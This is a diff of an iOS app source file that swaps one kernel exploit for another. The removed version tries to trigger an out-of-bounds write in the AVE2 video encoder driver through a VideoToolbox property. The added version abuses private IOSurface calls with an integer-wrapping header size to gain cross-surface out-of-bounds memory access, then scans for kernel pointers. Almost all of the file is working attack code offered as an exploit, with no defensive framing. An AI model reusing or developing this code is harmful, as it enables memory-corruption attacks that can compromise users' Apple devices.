@@ -1,16 +1,20 @@
 #import <Foundation/Foundation.h>
+#import <Metal/Metal.h>
 #import <UIKit/UIKit.h>
-#import <VideoToolbox/VideoToolbox.h>
-#import <CoreMedia/CoreMedia.h>
+#import <IOKit/IOKitLib.h>
+#import <mach/mach.h>
+#import <dlfcn.h>
 #import <sys/utsname.h>
 
-@interface AppDelegate : UIResponder <UIApplicationDelegate>
+// MARK: - Scene Delegate
+
+@interface SceneDelegate : UIResponder <UIWindowSceneDelegate>
 @property (strong, nonatomic) UIWindow *window;
 @property (strong, nonatomic) UITextView *logView;
 - (void)log:(NSString *)msg;
 @end
 
-@implementation AppDelegate
+@implementation SceneDelegate
 
 - (void)log:(NSString *)msg {
     NSString *line = [NSString stringWithFormat:@"%@\n", msg];
@@ -22,8 +26,8 @@
     });
 }
 
-- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
-    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
+- (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
+    self.window = [[UIWindow alloc] initWithWindowScene:(UIWindowScene *)scene];
     self.window.backgroundColor = [UIColor blackColor];
     
     UIViewController *vc = [[UIViewController alloc] init];
@@ -37,152 +41,202 @@
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== CVE-2026-112705 AVE2 EXPLOIT ==="];
+    [self log:@"=== F1OOB iPad A16 EXPLOIT ==="];
     
     struct utsname uts;
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
+    // Run exploit in background
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self runAVE2Exploit];
+        [self runExploit];
     });
-    
-    return YES;
 }
 
-- (void)runAVE2Exploit {
-    [self log:@"[1] Creating VTCompressionSession..."];
+- (void)runExploit {
+    // Step 1: Load IOSurface
+    [self log:@"[1] Loading IOSurface..."];
     
-    // Create compression session
-    VTCompressionSessionRef session = NULL;
-    OSStatus status = VTCompressionSessionCreate(
-        NULL,  // allocator
-        1920,  // width
-        1080,  // height
-        kCMVideoCodecType_H264,  // codec
-        NULL,  // encoder specification
-        NULL,  // source image buffer attributes
-        NULL,  // compressed data allocator
-        NULL,  // output callback
-        NULL,  // output callback refcon
-        &session
-    );
-    
-    if (status != noErr || !session) {
-        [self log:[NSString stringWithFormat:@"FAIL: VTCompressionSessionCreate: %d", (int)status]];
-        return;
-    }
-    [self log:@"PASS: Compression session created"];
-    
-    // Step 2: Get supported properties
-    [self log:@"[2] Querying supported properties..."];
-    CFArrayRef supportedProps = NULL;
-    status = VTSessionCopySupportedPropertyDictionary(session, &supportedProps);
-    if (status != noErr) {
-        [self log:[NSString stringWithFormat:@"FAIL: CopySupportedPropertyDictionary: %d", (int)status]];
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
+    void *handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    if (!handle) {
+        [self log:[NSString stringWithFormat:@"FAIL: dlopen: %s", dlerror()]];
         return;
     }
     
-    NSDictionary *props = (__bridge NSDictionary *)supportedProps;
-    [self log:[NSString stringWithFormat:@"Found %lu properties", (unsigned long)props.count]];
+    void *(*IOSurfaceCreate)(void *) = dlsym(handle, "IOSurfaceCreate");
+    void *(*IOSurfaceLock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceLock");
+    void *(*IOSurfaceUnlock)(uint32_t, uint32_t, uint32_t *) = dlsym(handle, "IOSurfaceUnlock");
+    void *(*IOSurfaceGetBaseAddress)(uint32_t) = dlsym(handle, "IOSurfaceGetBaseAddress");
+    size_t (*IOSurfaceGetAllocSize)(uint32_t) = dlsym(handle, "IOSurfaceGetAllocSize");
     
-    // Check if NumberOfTemporalLayers is supported
-    if (props[@"NumberOfTemporalLayers"]) {
-        [self log:@"PASS: NumberOfTemporalLayers is supported"];
-    } else {
-        [self log:@"WARNING: NumberOfTemporalLayers not in supported list"];
+    if (!IOSurfaceCreate || !IOSurfaceGetBaseAddress) {
+        [self log:@"FAIL: Missing IOSurface functions"];
+        return;
     }
+    [self log:@"PASS: IOSurface loaded"];
     
-    // Step 3: Set NumberOfTemporalLayers to trigger OOB write
-    [self log:@"[3] Setting NumberOfTemporalLayers = 16463 (trigger OOB)..."];
-    
-    CFNumberRef temporalLayers = CFNumberCreate(NULL, kCFNumberIntType, &(int){16463});
-    status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), temporalLayers);
-    CFRelease(temporalLayers);
-    
-    if (status != noErr) {
-        [self log:[NSString stringWithFormat:@"Property set returned: %d (may still trigger bug)", (int)status]];
-    } else {
-        [self log:@"Property set successfully"];
-    }
-    
-    // Step 4: Try to encode a frame to trigger the bug
-    [self log:@"[4] Creating sample buffer to trigger encode..."];
-    
-    // Create a simple CVPixelBuffer
-    CVPixelBufferRef pixelBuffer = NULL;
-    CFDictionaryRef pixelBufferAttrs = (__bridge CFDictionaryRef)@{
-        (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
-        (id)kCVPixelBufferWidthKey: @1920,
-        (id)kCVPixelBufferHeightKey: @1080,
-    };
-    
-    status = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_32BGRA, pixelBufferAttrs, &pixelBuffer);
-    if (status != noErr) {
-        [self log:[NSString stringWithFormat:@"FAIL: CVPixelBufferCreate: %d", (int)status]];
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
+    // Step 2: Open IOSurfaceRoot
+    [self log:@"[2] Opening IOSurfaceRoot..."];
+    io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
+    if (!root) {
+        [self log:@"FAIL: IOSurfaceRoot not found"];
         return;
     }
     
-    [self log:@"PASS: Pixel buffer created"];
-    
-    // Lock and fill with pattern
-    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
-    void *baseAddress = CVPixelBufferGetBaseAddress(pixelBuffer);
-    if (baseAddress) {
-        memset(baseAddress, 0x41, 1920 * 1080 * 4);
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(root, mach_task_self(), 0, &conn);
+    IOObjectRelease(root);
+    if (kr != KERN_SUCCESS) {
+        [self log:[NSString stringWithFormat:@"FAIL: IOServiceOpen: 0x%x", kr]];
+        return;
     }
-    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
+    [self log:@"PASS: IOSurfaceRoot opened"];
     
-    // Create sample buffer
-    CMFormatDescriptionRef formatDesc = NULL;
-    CMVideoFormatDescriptionCreateForImageBuffer(NULL, pixelBuffer, &formatDesc);
+    // Step 3: Create F1 surface with 4GB header (integer wrap)
+    [self log:@"[3] Creating F1 surface (4GB header wrap)..."];
     
-    CMSampleBufferRef sampleBuffer = NULL;
-    CMSampleTimingInfo timing = {kCMTimeInvalid, kCMTimeZero, kCMTimeInvalid};
-    CMSampleBufferCreateForImageBuffer(NULL, pixelBuffer, YES, NULL, NULL, formatDesc, &timing, &sampleBuffer);
+    const char *f1_xml =
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<plist version=\"1.0\"><dict>"
+        "<key>IOSurfaceIsGlobal</key><true/>"
+        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+        "<key>IOSurfaceWidth</key><integer>256</integer>"
+        "<key>IOSurfaceHeight</key><integer>256</integer>"
+        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
+        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneCount</key><integer>1</integer>"
+        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
+        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
+        "<key>IOSurfaceSliceCount</key><integer>4</integer>"
+        "</dict></plist>";
     
-    if (sampleBuffer) {
-        [self log:@"PASS: Sample buffer created"];
-        
-        // Encode — this triggers the OOB write in AVE2 driver
-        [self log:@"[5] Encoding frame (triggering OOB write)..."];
-        [self log:@"If device panics/reboots = OOB write hit kernel"];
-        [self log:@"If app crashes = OOB write hit userspace (still useful)"];
-        [self log:@"If nothing happens = bug not triggered"];
-        
-        status = VTCompressionSessionEncodeFrame(session, pixelBuffer, kCMTimeZero, kCMTimeInvalid, NULL, NULL, NULL);
-        
-        [self log:[NSString stringWithFormat:@"Encode returned: %d", (int)status]];
-        
-        // Wait a bit for async encode
-        [self log:@"Waiting for encode to complete..."];
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            [self log:@"[6] Encode timeout — checking status..."];
-            
-            // Clean up
-            CFRelease(sampleBuffer);
-            CFRelease(formatDesc);
-            CVPixelBufferRelease(pixelBuffer);
-            VTCompressionSessionInvalidate(session);
-            CFRelease(session);
-            
-            [self log:@"=== EXPLOIT COMPLETE ==="];
-            [self log:@"If device is still running, OOB write may have succeeded silently"];
-            [self log:@"Check kernel logs or system behavior for anomalies"];
-        });
-    } else {
-        [self log:@"FAIL: Could not create sample buffer"];
-        CVPixelBufferRelease(pixelBuffer);
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
+    uint32_t f1_id = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0, f1_xml, strlen(f1_xml)+1, NULL, NULL, &f1_id, NULL);
+    if (kr != KERN_SUCCESS || !f1_id) {
+        [self log:[NSString stringWithFormat:@"FAIL: F1 create: 0x%x", kr]];
+        IOServiceClose(conn);
+        return;
     }
+    [self log:[NSString stringWithFormat:@"PASS: F1 surface ID = %u", f1_id]];
+    
+    // Step 4: Create victim surface immediately after
+    [self log:@"[4] Creating victim surface..."];
+    
+    const char *vic_xml =
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+        "<plist version=\"1.0\"><dict>"
+        "<key>IOSurfaceIsGlobal</key><true/>"
+        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+        "<key>IOSurfaceWidth</key><integer>256</integer>"
+        "<key>IOSurfaceHeight</key><integer>256</integer>"
+        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfaceBytesPerRow</key><integer>1024</integer>"
+        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+        "</dict></plist>";
+    
+    uint32_t vic_id = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0, vic_xml, strlen(vic_xml)+1, NULL, NULL, &vic_id, NULL);
+    if (kr != KERN_SUCCESS || !vic_id) {
+        [self log:[NSString stringWithFormat:@"FAIL: Victim create: 0x%x", kr]];
+        IOServiceClose(conn);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"PASS: Victim surface ID = %u", vic_id]];
+    
+    // Step 5: Get F1 base address and test OOB
+    [self log:@"[5] Testing F1 OOB access..."];
+    
+    void *f1_base = IOSurfaceGetBaseAddress(f1_id);
+    if (!f1_base) {
+        [self log:@"FAIL: F1 base address is NULL"];
+        IOServiceClose(conn);
+        return;
+    }
+    [self log:[NSString stringWithFormat:@"F1 base: %p", f1_base]];
+    
+    // Lock F1 surface
+    uint32_t seed = 0;
+    IOSurfaceLock(f1_id, 1, &seed);
+    
+    // Test: Read beyond 64KB boundary
+    [self log:@"Reading beyond 64KB..."];
+    uint64_t *ptr = (uint64_t *)f1_base;
+    
+    for (int i = 0x10000/8; i < 0x10000/8 + 0x100; i += 0x20) {
+        uint64_t val = ptr[i];
+        if (val != 0 && val != 0x4141414141414141) {
+            [self log:[NSString stringWithFormat:@"OOB[0x%x] = 0x%llx", i*8, val]];
+        }
+    }
+    
+    // Test: Write beyond 64KB and check if victim is affected
+    [self log:@"Testing cross-surface write..."];
+    
+    void *vic_base = IOSurfaceGetBaseAddress(vic_id);
+    if (vic_base) {
+        [self log:[NSString stringWithFormat:@"Victim base: %p", vic_base]];
+        
+        // Write marker to victim
+        *(uint32_t *)vic_base = 0x47474747;
+        [self log:@"Wrote 0x47474747 to victim[0]"];
+        
+        // Try to reach victim through F1 OOB
+        // Victim is allocated after F1, so it should be at higher address
+        // Try various offsets
+        for (int offset = 0x10000; offset < 0x100000; offset += 0x1000) {
+            uint32_t *test = (uint32_t *)((uint8_t *)f1_base + offset);
+            if (*test == 0x47474747) {
+                [self log:[NSString stringWithFormat:@"*** FOUND VICTIM AT F1+0x%x ***", offset]];
+                
+                // Test write
+                *test = 0x43434343;
+                if (*(uint32_t *)vic_base == 0x43434343) {
+                    [self log:@"*** CROSS-SURFACE OOB WRITE CONFIRMED ***"];
+                    
+                    // Scan for kernel pointers
+                    [self log:@"Scanning for kernel pointers..."];
+                    for (int j = 0; j < 0x1000/8; j++) {
+                        uint64_t val = ((uint64_t *)vic_base)[j];
+                        if ((val >> 40) == 0xffffff || (val >> 44) == 0xfffff) {
+                            [self log:[NSString stringWithFormat:@"KERNEL PTR at victim[0x%x]: 0x%llx", j*8, val]];
+                        }
+                    }
+                }
+                break;
+            }
+        }
+    }
+    
+    IOSurfaceUnlock(f1_id, 1, &seed);
+    IOServiceClose(conn);
+    
+    [self log:@"=== EXPLOIT COMPLETE ==="];
 }
 
 @end
+
+// MARK: - App Delegate
+
+@interface AppDelegate : UIResponder <UIApplicationDelegate>
+@end
+
+@implementation AppDelegate
+
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+    return YES;
+}
+
+- (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
+    UISceneConfiguration *config = [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
+    config.delegateClass = [SceneDelegate class];
+    return config;
+}
+
+@end
+
+// MARK: - Main
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
